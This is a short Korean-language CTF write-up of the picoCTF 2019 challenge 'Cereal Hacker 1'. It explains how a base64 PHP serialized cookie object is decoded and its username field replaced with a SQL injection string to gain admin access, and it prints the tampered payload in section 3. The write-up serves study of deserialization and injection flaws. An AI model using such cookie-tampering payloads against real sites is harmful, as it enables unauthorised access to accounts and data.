---
title: Cereal Hacker 1 — picoCTF 2019 PHP deserialization writeup
created: 2026-06-19
updated: 2026-06-21
type: query
tags: [ctf, web, php, deserialization, unserialize, cookie, object-injection, sqli]
sources: [https://github.com/kevinjycui/picoCTF-2019-writeup/blob/master/Web%20Exploitation/cereal%20hacker%201/README.md]
confidence: high
---

# Cereal Hacker 1 — picoCTF 2019 PHP deserialization writeup

> `user_info` 쿠키가 base64로 인코딩된 PHP serialized 객체입니다. guest 권한 객체를 SQL injection이 섞인 admin 객체로 바꾸면 admin 페이지에 접근할 수 있습니다.

## 참고 URL
- [Original writeup](https://github.com/kevinjycui/picoCTF-2019-writeup/blob/master/Web%20Exploitation/cereal%20hacker%201/README.md)


## 1. 한 줄 요약
- `user_info` 쿠키 값(`TzoxMToicGVybWlzc2lvbnMiOjI6...`)을 base64 디코딩하면 PHP serialized 객체가 나옵니다.
- 객체 구조: `O:11:"permissions":2:{s:8:"username";s:5:"guest";s:8:"password";s:5:"guest";}`
- SQL injection 문자열을 username에 넣어 serialized 객체를 조작하고, 다시 base64 인코딩해 쿠키로 제출합니다.
- admin 페이지(`index.php?file=admin`)에 접근하면 flag를 얻습니다.

## 2. 취약점 흐름
| 단계 | 관찰 | 의미 |
|------|------|------|
| 1 | 쿠키가 base64로 인코딩된 serialized 객체 | unserialize()가 있을 가능성 |
| 2 | guest로 로그인 후 user_info 쿠키 관찰 | 객체 구조 파악 |
| 3 | username에 SQL injection 문자열 삽입 | 인증 우회 시도 |
| 4 | 조작된 쿠키로 admin 페이지 접근 | 권한 상승 성공 |

## 3. 핵심 payload
```php
// 원래 객체
O:11:"permissions":2:{s:8:"username";s:5:"guest";s:8:"password";s:5:"guest";}

// SQL injection 삽입
O:11:"permissions":2:{s:8:"username";s:16:"admin' or '1'='1";s:8:"password";s:0:"";}
```

## 4. 연결된 개념
- [[super-serial-final-writeup]]
- [[web-ctf-writeup-auth-session]]
- [[web-ctf-writeup-family-hub]]

## 5. 참고 소스
- [kevinjycui — picoCTF-2019-writeup](https://github.com/kevinjycui/picoCTF-2019-writeup/blob/master/Web%20Exploitation/cereal%20hacker%201/README.md)
